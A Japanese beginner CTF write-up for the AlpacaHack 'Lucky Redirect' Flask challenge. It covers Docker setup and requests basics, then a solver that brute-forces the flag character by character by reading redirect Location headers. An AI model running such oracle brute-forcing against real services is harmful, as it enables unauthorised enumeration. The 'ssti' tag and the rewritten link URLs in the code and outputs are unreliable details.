---
title: "Lucky Redirect - AlpacaHack Daily"
category: "web"
subcategory: "ssti"
type: "writeup"
tags: ["web", "alpacahack", "flask", "werkzeug", "render-template", "regex"]
summary: "web writeup for \"Lucky Redirect\" from AlpacaHack Daily - techniques: alpacahack, flask, werkzeug, render-template, regex."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d03_Lucky_Redirect/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "Lucky Redirect"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** Lucky Redirect
- **Date:** 2026-07-03
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d03_Lucky_Redirect>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d03_Lucky_Redirect/README.md>

---
# Lucky Redirect

## 問題

Google 検索の「検索」ボタンは一度も使ったことがありません。私には「I'm Feeling Lucky」ボタンだけで十分です。

```py
import re
from flask import Flask, url_for, redirect
import secrets

FLAG = "Alpaca{REDACTED}"
assert re.fullmatch(r"Alpaca\{\w+\}", FLAG)

app = Flask(__name__)

@app.errorhandler(404)
def page_not_found(e):
    return redirect(url_for("nope"))


for i in range(len(FLAG)):
    def make_route(i):
        @app.get("/" + "/".join(FLAG[:i+1]), endpoint=f"flag_{i}")
        def route():
            is_lucky = secrets.randbelow(5) == 0
            if is_lucky and i == len(FLAG) - 1:
                return f"Well done! The flag is: {FLAG}"
            elif is_lucky:
                return redirect(url_for(f"flag_{i+1}"))
            else:
                return redirect(url_for("nope"))

        return route

    make_route(i)


@app.get("/nope")
def nope():
    return "Nope"

@app.get("/")
def index():
    return '<a href="https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/A">Feeling lucky?</a>'

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)
```

## 概要

ブラウザでアクセスし、リンクをクリックして`/A`にアクセスすると、`Nope`とだけ表示されます。

ソースコードを見ると、フラグの文字に沿った`/A`,`/A/l`,`/A/l/p`,...へのアクセスが認められ、アクセスすると5分の1の確率で次に進み、全てのフラグ文字を含むURLにアクセスすると5分の1の確率でそれがフラグであることを教えてくれるようです。

素直に`/A`にアクセスしてフラグ表示までたどり着ける確率は天文学的ですが、どうすればフラグを得ることができるのでしょうか？

## 説明

今回も初心者用向けモードで説明していこうと思います。

### Dockerについて

配布ファイルを見ると、Pythonソースコードのapp.pyの他に、compose.yamlとDockerfileという2つのファイルも含まれています。

これらは、Dockerのコンテナ（隔離環境）でプログラムを実行するために使うファイルで、一部のCTFでは、サーバーとの環境差をなくすためにソースコードと一緒に配布されることがあるようです。

Daily AlpacaHackではほとんどの問題で配布されています。

本番サーバーだけで解いても良いかもしれませんが、ローカル環境の方が圧倒的に速いし、いろいろ手を加えて実験しながら実行できるので、使えるようになった方が良いです。

### ローカルサーバーの起動

ローカル環境にサーバーを立ててアクセスできるようにする方法について説明します。（例によってWindows環境想定です。）

まず、[公式サイト](https://www.docker.com/products/docker-desktop/)からDocker Desktopをダウンロードし、インストール、起動します。

問題の配布ファイルを展開したら、フォルダを開き、compose.yamlファイルを探します。

見つけたら、そのフォルダ内の何もないところを右クリックし、「ターミナルで開く」をクリックします。

すると、そのフォルダがカレントディレクトリのターミナルが開くので、下記のコマンドを実行してください。
```
docker compose up
```
※Docker Desktopが開いていないとできません。先にDocker Desktopを開いてから行ってください。

なにやらバーッと英数文字列が出たあと、しばらくすると止まります。そうしたら準備完了です。

compose.yamlを見てください。
```yaml
    ports:
      - ${PORT:-3000}:3000
```
3000番ポートで起動していることがわかります。

よって、Chromeなどのブラウザで、
```
localhost:3000/
```
にアクセスすると、ページが開きます。

ターミナルにはログも出力されるので、挑戦中役に立つことがあります。

終了するときはCtrl+Cで止めることができます。

再度実行するときは同じコマンドでいいですが、ソースを書き換えたりしたときは、
```
docker compose up --build
```
のように`--build`を付けないと変更が反映されないことがあるようです。

すべて終えて作成されたものを全て削除したいときは、
```
docker compose down --rmi all
```
を実行します。

こうするとコンテナもイメージも全て削除されきれいさっぱりなくなります。

### requestsモジュールを使ったアクセス

ブラウザからではなく、Pythonのrequestsモジュールを使ってアクセスする方法もCTFではよく使われます。

ローカルのサーバーの準備ができたら、Pythonで下記のプログラムを実行してみてください。
```py
import requests

URL = "http://localhost:3000/"

res = requests.get(URL)
print(res.status_code)
print(res.headers)
print(res.text)
```

※実行のしかたがわからない方は、[The flag is A+BのWriteup](https://github.com/baumroll0928-spec/myRepository/tree/main/Daily_AlpacaHack/m202607/d02_Flag_is_A_plus_B)にやり方が書いてあるので参考としてください。

※実行時にModuleNotFoundErrorがでる場合はターミナルで下記を実行してインストールしてください。
```
pip install requests
```

実行すると、下記のように出力されるはずです。
```
200
{'Server': 'Werkzeug/3.1.8 Python/3.14.6', 'Date': 'Fri, 03 Jul 2026 12:08:02 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '31', 'Connection': 'close'}
<a href="https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/A">Feeling lucky?</a>
```
ステータスコードとレスポンスヘッダー、レスポンスボディをそれぞれ受け取ることができました。

### flaskについて

flaskは、PythonでWebアプリを作るためのフレームワークで、Daily AlpacaHackでもときどきでてきます。

基本構造だけざっと説明すると、
```py
from flask import Flask

app = Flask(__name__)
```
でアプリを初期化、
```py
@app.get("/")
def 関数名():
    ...
```
のところにルートにアクセスしたときの処理を書きます。

この処理の最後に
```py
    return ...
```
でHTMLを返します。

※render_templateでテンプレートファイルを使う方法もありますが今回は割愛します。

この問題では出てきませんが、
```py
@app.post("/login")
def index_login():
    ...
```
のようにするとPOSTの処理も記述することができます。

最後に
```py
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)
```
で、3000番ポートで受付を開始するようになります。

## 解法

これ、例えば`/B`みたいな存在しないURLにアクセスするとどうなるのでしょうか？

というのは、存在する場合としない場合で違いがあるなら、例えば`/A/l/p/a/c/a/{/A`,`/A/l/p/a/c/a/{/B`,...のように最後の文字を変えながら順次アクセスしていけば正しい文字が1文字ずつ判明していくのではないかと思ったからです。

しかし、
```py
@app.errorhandler(404)
def page_not_found(e):
    return redirect(url_for("nope"))
```
でページが見つからない404エラーをnopeページにリダイレクトしなおしているので、`/A`にアクセスしても、
```
200
{'Server': 'Werkzeug/3.1.8 Python/3.14.6', 'Date': 'Xxx, 00 Xxx 2026 00:00:00 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '4', 'Connection': 'close'}
Nope
```
`/B`にアクセスしても、
```
200
{'Server': 'Werkzeug/3.1.8 Python/3.14.6', 'Date': 'Xxx, 00 Xxx 2026 00:00:00 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '4', 'Connection': 'close'}
Nope
```
全く違いがありませんでした。

ここで、.get(...)の引数に`allow_redirects=False`を付けると、リダイレクトを追跡しなくなることを利用します。

リダイレクトってサーバーが勝手に処理して送りつけてくるようなイメージがありますが、実はクライアント側がその都度自動的に要求していたんですね。

イメージとしてはこんな感じです。

あなたには以前よく通っていたレストランがあるとします。

久しぶりに行ってみると、店に人影は無く、入り口には１枚の張り紙が貼られていました。

「当店は○○町○丁目○番○号に移転しました。お手数ですがこちらまでお越しください。」

これを見たあなたは、実際にその場所に行ってみるもよし、諦めて帰るもよし、というわけです。

Webサーバーの話に戻ると、リダイレクト先があるときサーバーはステータスコード302とともにリダイレクト先を送ってきます。

通常ブラウザで見るときや.get(URL)で普通に見るときは自動的にリダイレクト先の情報を取りに行くので302を見ることはありません。

さて、`allow_redirects=False`をつけて違いを見てみましょう。

`/A`のとき
```
302
{'Server': 'Werkzeug/3.1.8 Python/3.14.6', 'Date': 'Xxx, 00 Xxx 2026 00:00:00 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '197', 'Location': '/nope', 'Connection': 'close'}
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/nope">/nope</a>. If not, click the link.
```
`/B`のとき
```
302
{'Server': 'Werkzeug/3.1.8 Python/3.14.6', 'Date': 'Xxx, 00 Xxx 2026 00:00:00 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '197', 'Location': '/nope', 'Connection': 'close'}
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/nope">/nope</a>. If not, click the link.
```
あれ？これでも変わらない？

あ！大事なことを忘れていました！

存在するURLでも5回に1回しか次のURLに進めてくれないんでした。

`/A`に何度かアクセスしてみると、
```
302
{'Server': 'Werkzeug/3.1.8 Python/3.14.6', 'Date': 'Xxx, 00 Xxx 2026 00:00:00 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '195', 'Location': '/A/l', 'Connection': 'close'}
（略）
```
ときどき`Location`が`/A/l`になることがあります。

でも`/B`のときは何度やっても同じです。

これは次の文字へのリダイレクトが発生するまで1文字ごとに何十回何百回試す必要がありそうです。

## ソルバー作成

```py
import requests

URL = "http://localhost:3000/"
CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_}"

flag = "Alpaca{"
next_ch = ""
while next_ch != "}":
    next_ch = ""
    while next_ch == "":
        print(f"{flag = }")
        for ch in CHARS:
            res = requests.get(URL + "/".join(flag) + "/" + ch, allow_redirects=False)
            if res.status_code == 200 or res.headers['location'] != '/nope':
                next_ch = ch
                break
    flag += next_ch

print(f"Final flag: {flag}")
```
`flag`変数を1文字ずつ増やしながら試します。ただ最初の7文字は`Alpaca{`であることがすでに分かっているのでその部分は決め打ちにしてパスします。

その後、次の文字候補`ch`を回しながら次のページ、つまり`/nope`以外に飛ばそうとするときの文字を捉え、`flag`変数に付け足します。

実行してみると、
```
flag = 'Alpaca{'
flag = 'Alpaca{'
（略）
flag = 'Alpaca{REDACTED'
flag = 'Alpaca{REDACTED'
Final flag: Alpaca{REDACTED}
```
できたみたいです。

※「REDACTED」というのは編集済みという意味で、CTFではフラグなどの見られたくない部分を配布ファイルで伏字にするときに使われることが多いようです。

あとは、URLを本番環境のものに書き換えて実行します。
```
#URL = "http://localhost:3000/"
URL = "http://34.170.146.252:14016/"
```

これで実行すると、本番環境の正しいフラグを表示することができました。

## その他

Dockerでの実行は最初戸惑いますが、問題が変わってもやることはほとんど同じなので、何回かやれば慣れると思います。

今回、フラグが1文字ずつゆっくり確定されていくので、待っている間とても暇すぎて、もう予測して答えられないかなと思いいろいろな誤答を提出しました。

最初の3文字で「`_be_back}`か？」とか、1個目の`g`で「これ`give_up}`じゃない？」とか、3個目の`g`で「`again}`だよね？」とか。

`b`で全貌が見えましたが（大喜利とかでたまに見る「一行で矛盾する」やつですよね）、`bet}`？それとも`bet_it}`？`to_it}`とかか？とやっているうちに結局最後まで答えが出てしまいました（笑）
